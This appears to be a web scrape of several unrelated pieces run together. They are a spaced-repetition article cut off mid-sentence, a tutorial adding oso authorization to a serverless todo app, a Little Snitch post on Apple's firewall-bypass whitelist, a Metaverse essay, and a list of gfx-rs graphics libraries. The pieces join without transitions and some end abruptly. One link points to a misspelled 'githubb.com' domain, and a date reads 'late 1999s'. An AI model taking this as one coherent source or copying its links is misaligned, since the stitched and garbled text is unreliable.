<h2 id="the-centuries-old-science-they-dont-tell-you-about">The Centuries Old Science They Don’t Tell You About</h2>

<p>More than a hundred years ago, the German psychologist Hermann Ebbinghaus not only started the scientific study of memory, but he also made its most impactful discovery.&nbsp;</p>

<p>After all, what discovery could be more impactful than what makes memories stick?</p>

<p>Ebbinghaus created various lists of nonsense syllables that he had to memorize, and once he was able to mouth off the entire list without making a single mistake he would mark on his calendar the day where he had to memorize that list once more.&nbsp;</p>

<p>He would have to memorize some lists the day after, others a week and some a whole month after he had first memorized them. Doesn’t sound much fun, does it? This is especially true when you take into account each list must have taken him quite a long time to memorize since by design each of the three-letter syllables he had to study had been chosen so that they weren’t easily remembered. For example, the syllable BOL was out of the question as Ebbinghaus could instead use BALL to recall it.&nbsp;</p>

<p>After the requisite time had passed, to measure the extent to which he had forgotten the list he’d spent so much time memorizing, he memorized the same list once more. Not only did he have to sit still in his office for a long time trying to memorize a bunch of nonsense words once, he had to do it twice! Throughout his second attempt he did have some help since it would take him less time to memorize the list the second time around if he remembered it from his first foray cramming it into his memory.&nbsp;</p>

<p>If by that point he’d already forgotten it, then it would take him at least as much time to memorize the list the second time as it had the first. However, if some memory of it still lingered in the confines of his mind, he would be able to go through the list faster than before. By varying the amount of time between each attempt, and seeing how that influenced how long it took him then to memorize the list the second time, <span>Ebbinghaus was able to measure the effect time had on his memory.</span></p>

<p>And what an effect it had.&nbsp;</p>

<p>The first thing he noticed was that memories are at their most fragile when they are still young. From the data he’d collected, he could see that the bulk of forgetting happens in the few moments after the memory is created. Rather than forgetting happening at a linear pace over time, each day that passes nicking a constant amount of the vitality of a memory until it is completely forgotten, Ebbinghaus discovered <span>forgetting happens rather rapidly at first but slows down afterward.&nbsp;</span></p>

<p>In the first few hours of its life, it’s as if your newly created memory has jumped out of a flying airplane and is now free-falling through the sky, the wind buffeting its face violently as it quickly loses altitude. As the ground becomes uncomfortably close, our memory activates its parachute and begins to glide, still falling, of course, but much slower than it was when it first jumped out of the plane.&nbsp;
&nbsp;
Now, to be sure, <span>the forgetting curve,</span> as this discovery came to be called, is an important landmark in the scientific study of memory, but it’s not a particularly useful one. We forget things over time; what a discovery! You don’t need to be a top-level scientist to come to that conclusion. It’s why we’re here in the first place!</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b79bb8c6906d331e07905d708043194c5288a3bd/e385a/assets/images/agentleintroductiontoanki/forgettingcurve_alternative.jpg" alt=""></p>
<p> Behold, my superlative drawing skills!</p>
<p>But Ebbinghaus didn’t stop there.
&nbsp;
When he first started learning his lists of nonsense syllables, Ebbinghaus, like many a student, crammed all his studying in a single furious session. But then, possibly because he was fed up with all the cramming, he hit upon the idea of spreading his learning over time. Instead of spending the majority of a day learning one of his lists, he spaced out his learning over a few days. <span>What he found when he did so is the most important discovery about memory that no one ever told you about.</span></p>

<p>You would think not much would change if instead of studying a bunch of material in one day you did so over three or more days. But what Ebbinghaus found was that not only did his memory get stronger, but it also took him less time to memorize his lists. This meant that <span>simply by changing when he studied, Ebbinghaus could have the best of both worlds: a better memory with less time spent studying.&nbsp;</span></p>

<p>It need not be pointed out how important a discovery this is. If someone came up to you and told you about a revolutionary studying method that would not only cut the time you spent studying but also get you to retain the things you learn for longer, you would think you were being sold on some sort of scam.</p>

<p>Yet <span>the spacing effect,</span> as Ebbinghaus’ discovery is called, is far from being a scam. It is <span>one of the most scientifically supported discoveries in the entire field of psychology.</span></p>

<p>The gist of the spacing effect is rather simple. Given the choice between massing all your studying or spacing it out over a period of time, you are better served by spacing it out. <span>There is no catch. It really is that simple.&nbsp;</span></p>

<p>This means if you are a student and you have an exam coming up a month from now, you should start studying now rather than waiting until a single week is left. If, for example, you’re going to spend 50 hours studying, then spreading those hours over the whole month, ensuring that you get re-exposed to the material in sufficiently spaced intervals, would get you much better results than you would if you crammed those 50 hours in a single stress-filled and coffee-fueled week.&nbsp;</p>

<p>Of course, that’s easier said than done.&nbsp;</p>

<p><span>The spacing effect is one of the most important weapons a learner can have on his arsenal</span> but knowing about its amazing effects does not mean that we will necessarily apply it. After all, we all know not to eat too many processed foods do we not? Yet, that doesn’t seem to stop many of us.&nbsp;</p>

<p>Pulling an all-nighter to cram for an exam is like binging on a sugar-filled pastry when one is trying to lose weight, yet the fact it continues to be a staple learning strategy of many a student is a testament to how difficult it can be to embrace the lessons of the spacing effect.&nbsp;</p>

<p>If only there were an app for that…</p>

<h2 id="this-app-will-turn-your-memory-into-a-superpower">This App Will Turn Your Memory Into A Superpower</h2>

<p>One hundred years ago Ebbinghaus didn’t have a computer, let alone a smartphone. If he’d had them they would have taken care of the task of spacing what he had to learn for him. Instead, he had to do all of that himself, though if we consider that he was the kind of guy that did not balk at the idea of spending hundreds of hours learning endless lists of nonsense, perhaps he wasn’t that fazed by it.</p>

<p>Thankfully, today we have tools that manage all of that for us.</p>

<p><span> And it all starts with a simple flashcard.&nbsp;</span></p>

<p>Everyone knows how a flashcard is supposed to work. You write something on the front, then something on the back, and then you’re supposed to recall what it was that you wrote on the back after reading what’s on the front.&nbsp;</p>

<p>Suppose that in the process of studying for a coming exam, you wrote many of these flashcards. You have a big pile of them sitting on your desk and within them are all the things you have to know if you want to ace that exam.&nbsp;</p>

<p>Because you know about the spacing effect, you know that cramming those flashcards is a bad strategy, but then how are you supposed to space them out? There are so many cards to keep track of…</p>

<p><span>What    if those flashcards existed on your computer instead?&nbsp;</span></p>

<p>If that were possible, then the computer could take care of the task of keeping track when you’re supposed to review your flashcards and you could focus solely on the things that matter, which, in this case, is answering your flashcards correctly and acing that exam.&nbsp;</p>

<p>Which is why spaced repetition software was invented: to take care of all the grunt work so you can easily add spaced repetition into your life.</p>

<p>At its core, all spaced repetition software does is keep track of when to present you with the material that you put in it. It’s called spaced repetition software because they use special algorithms to calculate the optimal interval between when you last reviewed the material and …</p></div></section></div></div>

<p>The main benefit of developing a serverless application is that managing
servers, balancing load, scaling up and down, and a hundred other things become
<em>someone else's problem</em> (🎉). However, securing your serverless
application with authorization remains decidedly your problem.</p>
<p>The cloud providers offer some helpful primitives like <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html">authentication
solutions</a>, access control for <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/role-based-access-control.html">their own cloud
services</a>, and hooks for you to <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-use-lambda-authorizer.html">write your own custom
authorization code</a>, but much of the heavy lifting is left
up to you. In addition to writing tons (and <em>tons</em> and <strong><em>tons</em></strong>) of JSON,
you'll have to figure out the precise baton waves required to orchestrate your
authorization service / function / sidecar (/ clowncar) to ensure that
everything is wired up correctly (<code>"Resource": "*"</code> ought to do it) and that
it's <em>at least</em> as available as the service it's protecting.</p>
<p>Or you could skip all that and use <strong>oso</strong>, the open source policy engine for
authorization:</p>
<ul>
<li>
<p>Kiss gigantic JSON documents goodbye and write authorization logic in <a href="https://docs.osohq.com/using/polar-syntax.html">a
  declarative language</a> that mirrors the way you would explain
  the logic to a coworker.</p>
</li>
<li>
<p>Stop worrying about availability and orchestration by adding <a href="https://docs.osohq.com/using/libraries/index.html">the oso
  library</a> as a dependency and deploying it with the rest of
  your application code.</p>
</li>
<li>
<p>Render authorization decisions <em>quickly</em> with no time-wasting network hops or
  secondary service latency to contend with.</p>
</li>
</ul>
<p>In this post, we'll show you how oso makes it simple to add extensible,
fine-grained authorization to your serverless application.</p>
<h2>Starting out</h2>
<p>As our canvas, we're going to start with <a href="https://github.com/osohq/serverless-todo-app">a simple todo
app</a>. The app is written for Lambda's Node.js runtime, so
we'll be using <a href="https://docs.osohq.com/using/libraries/node/index.html">oso's Node.js library</a> to implement authorization.
However, if you wanted to add authorization to code written for a different
Lambda runtime, there are oso libraries for <a href="https://docs.osohq.com/using/libraries/python/index.html">Python</a>,
<a href="https://docs.osohq.com/using/libraries/ruby/index.html">Ruby</a>, <a href="https://docs.osohq.com/using/libraries/java/index.html">Java</a>, and <a href="https://docs.osohq.com/using/libraries/rust/index.html">Rust</a>, with more coming
soon.</p>
<p>The todo app consists of five Lambda functions (fronted by API Gateway)
covering the basic CRUD operations on top of a single DynamoDB table. To track
ownership, each todo has a <code>creator</code> field that contains a <code>User</code> populated
with a few fields from the Lambda event payload: <code>country</code>, <code>sourceIp</code>, and
<code>userAgent</code>.</p>
<p>Now that we have the lay of the land, let's fire up our serverless app (sans
authorization).</p>
<h2>No Authorization — No Code's evil twin</h2>
<p>If you don't want to get your hands dirty, the app is running (<strong>with
authorization in place</strong>) at <code>serverless-todo-app.oso.dev</code>. You may substitute
that address in every time you see <code>&lt;SERVICE_ENDPOINT&gt;</code> for the remainder of
the post.</p>
<p>If you're following along at home, you'll need a few things to get started:</p>
<ul>
<li>
<p>Clone <a href="https://github.com/osohq/serverless-todo-app">the repo</a> and <code>cd</code> into it.</p>
</li>
<li>
<p>Install dependencies with <code>npm install</code>.</p>
</li>
<li>
<p><a href="https://github.com/serverless/serverless/blob/d7b6fb748eba364aabeae3862f89b13262751c06/docs/providers/aws/guide/credentials.md">Set up AWS credentials for Serverless</a>.</p>
</li>
</ul>
<p>When you're all set up, <code>npm run serverless -- deploy</code> is the magic incantation
to coax some distant computers into action. After liftoff is achieved, you can
use cURL to interact with your extremely scalable todo app:</p>
<pre><code>$ curl https://&lt;SERVICE_ENDPOINT&gt;/todos
[]
$ curl https://&lt;SERVICE_ENDPOINT&gt;/todos -d '{"text":"my first todo!"}'
{"id":"0cf6cec0-247f-11eb-b64e-4df956b5b3e4","creator":{"country":"US","sourceIp":"1.2.3.4","userAgent":"curl/7.64.1"},"text":"my first todo!","checked":false,"createdAt":1605141365298,"updatedAt":1605141365298}
$ curl -XPUT https://&lt;SERVICE_ENDPOINT&gt;/todos/0cf6cec0-247f-11eb-b64e-4df956b5b3e4 -d '{"text":"my first updated todo!"}'
{"checked":false,"createdAt":1605141365298,"text":"my first updated todo!","creator":{"sourceIp":"1.2.3.4","country":"US","userAgent":"curl/7.64.1"},"id":"0cf6cec0-247f-11eb-b64e-4df956b5b3e4","updatedAt":1605141518919}
$ curl -XDELETE https://&lt;SERVICE_ENDPOINT&gt;/todos/0cf6cec0-247f-11eb-b64e-4df956b5b3e4
{"checked":false,"createdAt":1605141365298,"text":"my first updated todo!","creator":{"sourceIp":"1.2.3.4","country":"US","userAgent":"curl/7.64.1"},"id":"0cf6cec0-247f-11eb-b64e-4df956b5b3e4","updatedAt":1605141518919}
$ curl https://&lt;SERVICE_ENDPOINT&gt;/todos/0cf6cec0-247f-11eb-b64e-4df956b5b3e4
Not Found
</code></pre>

<p>Note that if you're hitting our hosted copy at <code>serverless-todo-app.oso.dev</code>,
requests to the list endpoint (<code>GET /todos</code>) will return a bunch of existing
todos instead of an empty list.</p>
<p>Our <s>battlestation</s> serverless todo app is now fully armed and
operational, but extremely vulnerable to <s>rebel attacks</s> unauthorized
shenanigans. Let's add some security!</p>
<h2>Adding authorization with oso</h2>
<p>First, add oso to our project: <code>npm install oso</code>.</p>
<p>Next, create an empty Polar file in the project root: <code>touch policy.polar</code>.
Polar is the declarative logic language used to write oso authorization rules,</p>
<p>The machinery of initializing oso and asking it to make an authorization
decision is identical across all five Lambdas, so we can wrap it in a function
in <code>src/helpers.js</code>:</p>
<pre><code>const { Oso } = require('oso');

const { User } = require('./User');

module.exports.may = async (user, action, resource) =&gt; {
  const oso = new Oso();
  oso.registerClass(Date);
  oso.registerClass(User);
  await oso.loadFile('policy.polar');
  return oso.isAllowed(user, action, resource);
};
</code></pre>

<p>We initialize oso, register the built-in <code>Date</code> object and our <code>User</code> class
(both of which we're going to use in our policy), load our Polar file, and then
ask oso if the loaded policy permits <code>user</code> to perform <code>action</code> on <code>resource</code>.</p>
<p>In each Lambda, we'll call our helper and return a 403 Forbidden if the user is
not authorized to perform the action on the resource in question:</p>
<pre><code>diff --git a/src/todos/update.js b/src/todos/update.js
index 86fff46..a5222a3 100644
--- a/src/todos/update.js
+++ b/src/todos/update.js
@@ -5,9 +5,10 @@ const { getTodo, updateTodo } = require('../db');
-const { error, success } = require('../helpers');
+const { error, may, success } = require('../helpers');

 module.exports.update = async (event, _context, cb) =&gt; {
   try {
-    const _user = User.fromEvent(event);
+    const user = User.fromEvent(event);
     const { id } = event.pathParameters;
     const todo = await getTodo(id);

-    // TODO: authorize access.
+    const authorized = await may(user, 'update', todo);
+    if (!authorized) return error(cb, { statusCode: 403 });
</code></pre>

<p>Or if we just want to authorize an action generally (as opposed to authorizing
an action on specific resources):</p>
<pre><code>// src/todos/list.js

// ...

const authorized = await may(user, 'list');
if (!authorized) return error(cb, { statusCode: 403 });

// ...
</code></pre>

<p>Once we've added those two lines to all of our Lambdas, we're now enforcing
authorization!</p>
<p><a href="https://github.com/osohq/serverless-todo-app/compare/authorized~">Click here</a> to see a full diff of adding oso to the project.</p>
<p>If you redeploy the app at this point (<code>npm run serverless -- deploy</code>), every
request will 403 because <strong>oso is deny-by-default</strong>. We haven't added any rules
to our policy file yet, so in oso's view of the world no one is authorized to
do anything.</p>
<p>This is obviously a bit <em>too</em> secure, so let's sketch out our authorization
requirements and write some Polar code.</p>
<h2>Writing declarative authorization logic</h2>
<p>Because of its critical role in application security, authorization logic has a
higher bar for readability and auditability than regular old business logic.
Polar was designed with readability as a first-class feature.</p>
<p>We're going to create five authorization rules, one for each Lambda. First,
we'll write the rule in prose, and then we'll show <a href="https://github.com/osohq/serverless-todo-app/blob/authorized/policy.polar">the corresponding Polar
code</a>.</p>
<ul>
<li>Any user is allowed to list todos:</li>
</ul>
<pre><code>allow(_: User, "list", _);
</code></pre>

<ul>
<li>Any user is allowed to create a new todo:</li>
</ul>
<pre><code>allow(_: User, "create", _);
</code></pre>

<ul>
<li>A user is allowed to view a specific todo if they are in the same country as
  the todo's creator:</li>
</ul>
<pre><code>allow(user: User, "view", todo) if
    user.country = todo.creator.country;
</code></pre>

<ul>
<li>A user is allowed to update a todo if their IP address and user agent match
  those of the todo's creator:</li>
</ul>
<pre><code>allow(user: User, "update", todo) if
    user.sourceIp = todo.creator.sourceIp
    and user.userAgent = todo.creator.userAgent;
</code></pre>

<ul>
<li>A user is allowed to delete a todo if they're allowed to update it <strong>and</strong>
  the todo was created within the last 5 minutes:</li>
</ul>
<pre><code>allow(user: User, "delete", todo) if
    allow(user, "update", todo)
    and ((new Date().getTime() - todo.createdAt) / (60 * 1000)) &lt; 5;
</code></pre>

<p>These rules show off a few of oso's strengths. Implementing fine-grained
<a href="https://docs.osohq.com/using/examples/abac.html">attribute-based access control</a> (ABAC) is simple when we can write rules
directly over application data (in this case, our <code>User</code> class and the
structured todo data). The rules are also composable and flexible — instead of
duplicating logic in the delete rule, we simply asked if the user was allowed
to update the todo and then extended it with an additional time-based check.
And, finally, we did some math to determine if five minutes has elapsed since
the todo's creation. We could have written a function to calculate the same
thing in our Lambda code, but it's a calculation that's only relevant in an
authorization context. By writing it here, we maintain <a href="https://docs.osohq.com/more/design-principles.html#separation-of-concerns-but-not-data">the separation of
concerns between our authorization and business logic</a>.</p>
<p>Once we've added those rules to our policy file, we can redeploy and interact
with our newly secured app:</p>
<pre><code>$ curl --user-agent "007" https://&lt;SERVICE_ENDPOINT&gt;/todos -d '{"text":"Do something nice for Moneypenny"}'
{"id":"9d8b9b02-3175-4211-a8fb-8645d1f70a11","creator":{"country":"US","sourceIp":"67.244.40.223","userAgent":"007"},"text":"Do something nice for Moneypenny","checked":false,"createdAt":1605211750276,"updatedAt":1605211750276}
$ curl --user-agent "Goldfinger" -XPUT https://&lt;SERVICE_ENDPOINT&gt;/todos/9d8b9b02-3175-4211-a8fb-8645d1f70a11 -d '{"text":"Retire, you putz!"}'
Can't do that, boss
</code></pre>

<h2>Conclusion</h2>
<p>We used oso to quickly add fine-grained authorization to our serverless app. We
leveraged the app's existing data model to express our authorization logic in a
few concise stanzas instead of commingling it with business logic in a tangle
of nested <code>if</code> / <code>else</code> statements. And we did it all with <a href="https://github.com/osohq/serverless-todo-app/compare/authorized">a minimal
application footprint</a> and no external service dependencies.</p>
<p>A fun extension would be hooking up Cognito for richer user data than the
Lambda event …</p></div></div></div>

                <!--kg-card-begin: image--><figure><img src="https://blog.obdev.at/content/images/2020/11/hole-in-the-wall.png"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p><a href="https://apple.com/privacy">Apple on Privacy</a>:</p>
<blockquote>
<p>Privacy is a fundamental human right. At Apple, it’s also one of our core values. Your devices are important to so many parts of your life. <strong>What you share from those experiences, and who you share it with, should be up to you. We design Apple products to protect your privacy and give you control over your information.</strong> It’s not always easy. But that’s the kind of innovation we believe in.</p>
</blockquote>
<p>We could not agree more. That’s why we created Little Snitch in the first place, 18 years ago.</p>
<p>It is your right to know where your computer connects to. To whom it talks. It’s your right to see these connections. It’s your right to allow them. And it’s your right to deny them.</p>
<p>That’s our philosophy. You should always be able to see what’s going on and to make informed decisions.</p>
<p>When we first discovered that Apple’s new Network Extension Framework — that all third party firewalls are now required to use on macOS Big Sur<sup><a href="#fn1" id="fnref1">[1]</a></sup> — didn’t report network traffic during some large software update download, we reported this bug to Apple on July 1 (FB7839544), hoping it would be fixed in the final version of Big Sur.</p>
<p>But it came worse. Three months later we realized, that a number of other Apple services like App Store, Maps or FaceTime also showed this strange behavior of acting invisibly, bypassing the new filter API. So we reported our new findings again on October 1 (FB8762834).</p>
<p>As it turned out, this behavior is on purpose. There’s an <a href="https://www.obdev.at/support/littlesnitch/245914647368270">explicit whitelist</a> that allows certain macOS services to bypass any third party firewalls and to communicate on the Internet without being even noticed by the user. A hole in the wall.</p>
<p>It is understandable, that some network connections are essential for a secure and smooth system operation. It makes sense to <a href="https://blog.jacopo.io/en/post/apple-ocsp">check the validity of signing certificates</a> to effectively protect against malware attacks. It makes sense to download critical security updates in a timely fashion to prevent malware from exploiting vulnerabilities that have already been fixed. Blocking such connections would usually cause more harm than good.</p>
<p>But hiding these connections completely from the user makes no sense. It contradicts the idea of a transparent and trustworthy system and undermines the user’s trust in that system.</p>
<p>We’ve been facing similar challenges in Little Snitch as well. If we allow users to block each and every network connection, they might inadvertently render their computer unusable, causing DNS lookups to hang, preventing users from logging into their accounts and more.</p>
<p>How did we solve it? By being transparent and informative. By telling users about the possible consequences that the denial of certain connections might have, and in some cases recommending them not to do so. By providing default firewall rules to allow a few essential connections, but still letting users opt out. By developing the <a href="https://obdev.at/iap/">Internet Access Policy</a> that also gives third party developers the possibility to explain, which connections their apps are about to make, and whether it’s OK or not to deny them.</p>
<p>But the final decision whether to accept the possible consequences should always be left to the user, to you.</p>
<p>In the light of the recent public discussions that this topic has triggered we are extremely confident that Apple stands by their word to give users control over their information and will therefore eliminate this kind of whitelisting in a future macOS update.</p>
<p>Just yesterday Apple announced their willingness to address such privacy concerns by improving the way how online certificate checks are performed, and even <a href="https://support.apple.com/en-us/HT202491">adding the possibility to completely opt out of these security protections</a>.</p>
<p>Until then we won’t be restless either. We are already working on an alternative technique how to make even those currently hidden connections visible again in Little Snitch in one of our next updates. Looks very promising so far!</p>
<p>So stay tuned and protect your privacy. It’s yours, after all.</p>

</div></div><div data-block-type="2" id="block-29baffae350c11fb3cab"><div><p><strong><em>An Introduction…</em></strong></p><p>Technology frequently produces surprises that nobody predicts. However, the biggest developments are often anticipated decades in advance. In 1945 Vannevar Bush described what he-called the “<a href="https://en.wikipedia.org/wiki/Memex">Memex</a>”, a single device that would store all books, records and communications, and mechanically link them together by association. This concept was then used to formulate the idea of “hypertext” (a term coined two decades later), which in turn guided the development of the World Wide Web (developed another two decades later). The “Streaming Wars” have only just begun, yet the first streaming video took place more than 25 years ago. What’s more, many of the attributes of this so-called war have been hypothesized for decades, such as virtually infinite supplies of content, on-demand playback, interactivity, dynamic and personalized ads, and the value of converging content with distribution.</p><p>In this sense, the rough outlines of future solutions are often understood and, in a sense, agreed upon well in advance of the technical capacity to produce them. Still, it’s often impossible to predict how they’ll fall into place, which features matter more or less, what sort of governance models or competitive dynamics will drive them, or what new experiences will be produced. By the time Netflix launched its streaming service, much of Hollywood knew that the future of television was online (IP TV had been deployed in the late 1999s). The challenge was <a href="https://twitter.com/ballmatthew/status/1146081701535330305?s=20">timing</a> and <a href="https://redef.com/original/the-digital-future-of-tv-networks-the-original-series-crunch">how to package such a service</a> (it took another 10 years for Hollywood to accept all of their channels, genres and content needs to be collapsed into a single app/brand). The popularity of video game broadcasting and YouTubers still elude many in the media industry, as does the idea that the best way to monetize content might be to give it away for free and charge for optional $0.99 items of no consequential value. The acquisition of media conglomerate Time Warner by landline internet giant AOL was set in 2000 based on the idea media and tech/distribution needed to converge, but was unwound in 2009 after it failed to produce much benefit. Nine years later, it was then bought by mobile internet giant AT&amp;T under the same premise.</p><p>While many technologists imagined some sort of “personal computer”, its attributes and timing were so unpredictable that Microsoft dominated the PC era that began in the 1990s rather than the mainframe domineer IBM. And while Microsoft<a href="https://twitter.com/stevesi/status/1214924421476929536?s=20"> clearly foresaw mobile</a>, it misread the role of the operating system and too much of the hardware, hence the rise of iOS and Android globally (and Microsoft’s shift from the OS layer to the app/services one). In a similar sense, Steve Jobs’ priorities for computing were always “right”, they were just too early and focused on the wrong device. More broadly, the two most dominant cases of the early Internet were instant messaging and email, and yet the importance of social apps/networks was still unexpected until the late 2000s. And for that matter, all of the prerequisites for building Facebook existed pre-Y2K, but Facebook didn't come along until 2005 – and even then, it was an accident.</p><p>Since the late 1970s and early 1980s, many of those in the technology community have imagined a future state of, if not quasi-successor to, the Internet – called the “Metaverse”. And it would revolutionize not just the infrastructure layer of the digital world, but also much of the physical one, as well as all the services and platforms atop them, how they work, and what they sell. Although the full vision for the Metaverse remains hard to define, seemingly fantastical, and decades away, the pieces have started to feel very real. And as always with this sort of change, its arc is as long and unpredictable as its end state is lucrative.</p><p>To this end, the Metaverse has become the newest macro-goal for many of the world’s tech giants. As I outlined in<a href="https://redef.com/original/fortnite-is-the-future-but-probably-not-for-the-reasons-you-think"> February of 2019</a>, it is the express goal of Epic Games, maker of the <em>Unreal Engine</em> and <em>Fortnite</em>. It is also <a href="https://www.facebook.com/zuck/posts/10111311886191191">the driver</a> behind Facebook’s purchase of Oculus VR and its newly announced Horizon virtual world/meeting space, among<a href="https://www.theinformation.com/articles/to-control-its-destiny-facebook-bets-big-on-hardware"> many, many other projects</a>, such as AR glasses and brain-to-machine communications. The tens of billions that will be <a href="https://redef.com/original/how-cloud-gaming-will-and-wont-disrupt">spent on cloud gaming</a> over the next decade, too, is based on the belief that such technologies will underpin our online-offline future.</p><p>Ultimately, you’ll find many of the same items in the offices of Big Tech CEOs. However, the most well-worn is likely to be a copy of Neal Stephenson’s <em>Snow Crash</em>, which first described and essentially coined the terms “Metaverse” and “Avatar”. And there are many reasons why.</p><p><strong>CHAPTER 1: WHAT IS THE “METAVERSE”</strong></p><p>The most common conceptions of the Metaverse stem from science fiction. Here, the Metaverse is typically portrayed as a sort of digital “jacked-in” internet – a manifestation of actual reality, but one based in a virtual (often theme park-like) world, such those portrayed in <em>Ready Player One</em> and <em>The Matrix</em>. And while these sorts of experience are likely to be an <em>aspect</em> of the Metaverse, this conception is limited in the same way movies like <em>Tron </em>portrayed the Internet as a literal digital “information superhighway” of bits. </p><p>Just as it was hard to envision in 1982 what the Internet of 2020 would be — and harder still to communicate it to those who had never even “logged” onto it at that time — we don’t really know how to describe the Metaverse. However, we can identify core attributes.</p><p>The Metaverse, we think, will...</p><ol data-rte-list="default"><li><p><strong>Be persistent</strong> – which is to say, it never “resets” or “pauses” or “ends”, it just continues indefinitely</p></li><li><p><strong>Be synchronous and live </strong>– even though pre-scheduled and self-contained events will happen, just as they do in “real life”, the Metaverse will be a living experience that exists consistently for everyone and in real time</p></li><li><p><strong>Have no real cap to concurrent participations with an individual sense of “presence” </strong>– everyone can be a part of the Metaverse and participate in a specific event/place/activity together, at the same time and with individual agency</p></li><li><p><strong>Be a fully functioning economy </strong>– individuals and businesses will be able to create, own, invest, sell, and be rewarded for an incredibly wide range of “work” that produces “value” that is recognized by others</p></li><li><p><strong>Be an experience that spans </strong>both the digital and physical worlds, private and public networks/experiences, and open and closed platforms</p></li><li><p><strong>Offer unprecedented interoperability </strong>of data, digital items/assets, content, and so on across each of these experiences – your “Counter-Strike” gun skin, for example, could also be used to decorate a gun in <em>Fortnite</em>, or be gifted to a friend on/through Facebook. Similarly, a car designed for <em>Rocket League</em> (or even for Porsche’s website) could be brought over to work in <em>Roblox. </em>Today, the digital world basically acts as though it were a mall where though every store used its own currency, required proprietary ID cards, had proprietary units of measurement for things like shoes or calories, and different dress codes, etc.</p></li><li><p>Be populated by “content” and “experiences” <strong>created and operated by an incredibly wide range of contributors</strong>, some of whom are independent individuals, while others might be informally organized groups or commercially-focused enterprises</p></li></ol><p>There are a few other ideas that may be core to the Metaverse, but are not widely agreed upon. One of these concerns is whether participants will have a single consistent digital identity (or “avatar”) that they will use across all experiences. This would have practical value but is probably unlikely as each of the leaders in the “Metaverse era” will still want their own identity systems. Today, for example, there are a few dominant account systems – but none have exhaustive coverage of the web and they often stack atop one another with only limited data sharing/access (e.g. your iPhone is based around an iOS account, then you might log into an app using your Facebook ID, which itself is your Gmail account). </p><p>There is also disagreement on how much interoperability is required for the Metaverse to really be “the Metaverse”, rather than just an evolution of today’s Internet. Many also debate whether a true Metaverse can have a single operator (as is the case in <em>Ready Player One</em>). Some believe the definition (and success) of a Metaverse requires it to be a heavily decentralized platform built mostly upon community-based standards and protocols (like the open web) and an “open source” Metaverse OS or platform (this doesn’t mean there won’t be dominant closed platforms in the Metaverse).</p><p>Another idea relates to the fundamental communications architecture of the Metaverse. This is described in more detail later in the piece, but while today’s Internet is structured around individual servers “talking” to one another on an as-needed basis, some believe the Metaverse needs be “wired” and “operated” around persistent many-to-many connections. But even here, there’s no consensus around exactly how this would work, nor the degree of decentralization required. </p><p>It’s also helpful to consider what the Metaverse is often, but incorrectly, likened to. While each of these analogies is likely to be a part of the Metaverse, they aren’t actually the Metaverse.

<h2 id="nodes">Nodes</h2>

<p><a href="https://github.com/MaikKlein/ash/">ash</a> - Vulkan bindings we use in <em>gfx-rs</em>, external to us.</p>

<p><a href="https://github.com/gfx-rs/metal-rs">metal-rs</a> - Metal bindings crate we use in <em>gfx-rs</em>, also used outside.</p>

<p><a href="https://github.com/gfx-rs/d3d12-rs">d3d12-rs</a> - simple D3D12 convenience wrapper we use in <em>gfx-rs</em>.</p>

<p><a href="https://github.com/retep998/winapi-rs">winapi</a> - WinAPI bindings we use in <em>gfx-rs</em> for both DX11 and DX12 (where <em>d3d12-rs</em> has gaps), external to us.</p>

<p><a href="https://github.com/grovesNL/glow">glow</a> - OpenGL (including ES and WebGL) bindings we use in <em>gfx-rs</em>, also used outside.</p>

<p><a href="https://github.com/gfx-rs/gfx">gfx-rs</a> - our portable graphics API in Rust, tightly following Vulkan.</p>

<p><a href="https://github.com/gfx-rs/portability">gfx-portability</a> - a <a href="https://www.khronos.org/blog/fighting-fragmentation-vulkan-portability-extension-released-implementations-shipping">Vulkan Portability</a> API wrapper around <em>gfx-rs</em>. Can be used as a drop-in Vulkan driver on platforms without native Vulkan support.</p>

<p><a href="https://github.com/KhronosGroup/SPIRV-Cross">SPIRV-Cross</a> - shader translation library in C++, taking SPIR-V as an input.  It’s developed by a few Khronos members. We currently use it for generating platform-specific shaders in <em>gfx-rs</em>. We are phasing it away, replacing by <em>naga</em> gradually (the striped fill signifies deprecation in the diagram).</p>

<p><a href="https://github.com/gfx-rs/naga">naga</a> - our new shader translation library in Rust, it has a number of front-ends (SPIR-V, GLSL, and WGSL so far), various backends (SPIR-V, MSL, GLSL so far), and a solid intermediate representation (IR) in the middle. It’s a young project, and we are slowly rolling it out to replace the C++ blocks around the ecosystem, such as SPIRV-Cross and glsl-to-spirv/shaderc (used by many gfx/wgpu/Vulkan devs).</p>

<p><a href="https://github.com/gfx-rs/wgpu">wgpu</a> - our implementation of WebGPU API in Rust. It’s safe, portable, and fast (in this order).</p>
<ul>
  <li>Uses <em>gfx-rs</em> to reach the hardware.</li>
  <li>Uses <em>naga</em> to parse WGSL shaders, as well as introspect both SPIR-V and WGSL shaders. This allows us to validate the shaders, also to derive the implicit bind group layouts.</li>
  <li>able to record and replay <a href="http://kvark.github.io/wgpu/debug/test/ron/2020/07/18/wgpu-api-tracing.html">API traces</a> across platforms.</li>
</ul>

<p><a href="https://github.com/gfx-rs/wgpu-rs">wgpu-rs</a> - idiomatic Rust bindings to <em>wgpu</em>, meant for Rust end-users. Has many dependent <a href="https://github.com/gfx-rs/wgpu-rs/wiki/Applications-and-Libraries">applications and libraries</a>, including Nannou and Bevy.</p>
<ul>
  <li>Currently able to target <em>wgpu</em> as well as the WebGPU/WASM (experimental in browsers).</li>
  <li>Will be able to link to an implementation behind the portable <a href="https://github.com/webgpu-native/webgpu-headers">WebGPU C header</a>, such as <em>wgpu-native</em>.</li>
</ul>

<p><a href="https://githubb.com/gfx-rs/wgpu-native">wgpu-native</a> - a wrapper around <em>wgpu</em> that exposes a WebGPU C API conforming to the <a href="https://github.com/webgpu-native/webgpu-headers">shared header</a>. The plan is to have it accessible by non-Rust libraries, as a drop-in replacement for <a href="https://dawn.googlesource.com/dawn">Dawn</a>, also accessible via <a href="https://nodejs.org/api/n-api.html">NAPI</a>.</p>

<p><a href="https://github.com/denoland/deno">Deno</a> - JS/TS runtime in Rust. There is a mostly complete <a href="https://github.com/denoland/deno/pull/7977">PR #7977</a> delivering support for WebGPU via <em>wgpu</em>. It should allow native JS/TS applications (such as  <em>TensorFlow.js</em>) using WebGPU to run directly on top of <em>wgpu</em> in the future.</p>

<p><a href="https://github.com/servo/servo">Servo</a> - an experimental browser engine in Rust. It has WebGPU support via <em>wgpu</em>.</p>

